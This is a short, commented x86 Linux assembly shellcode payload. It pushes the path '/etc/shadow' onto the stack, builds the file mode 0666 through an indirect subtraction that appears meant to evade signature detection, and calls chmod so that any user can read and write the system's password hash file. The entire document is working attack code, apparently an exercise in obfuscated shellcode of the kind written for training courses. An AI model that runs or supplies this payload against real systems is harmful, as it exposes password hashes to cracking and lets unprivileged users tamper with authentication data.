global _start

section .text

_start:

xor ecx, ecx ; this zeros out the ECX register
mul ecx	; this zeros out the EAX and the EDX register
push edx ; push the null terminator on to te stack
push dword 0x776f6461 ; pushes "/etc/shadow" on to the stack
push dword 0x68732f2f ; pushes "/etc/shadow" on to the stack 
push dword 0x6374652f ; pushes "/etc/shadow" on to the stack
mov edi, esp ; save the stack pointer in the EDI register
xchg ebx, edi	; save the stack pointer back in the EBX register
push word 0x1ff	; push "777" instead of "666" (in octal) on to the stack
pop ecx ; pop "777" into the ECX register
sub ecx, 0x49	; get the value in the ECX register back down to '666' by subtracting '111'
mov al, 0xf ; chmod syscall
int 0x80
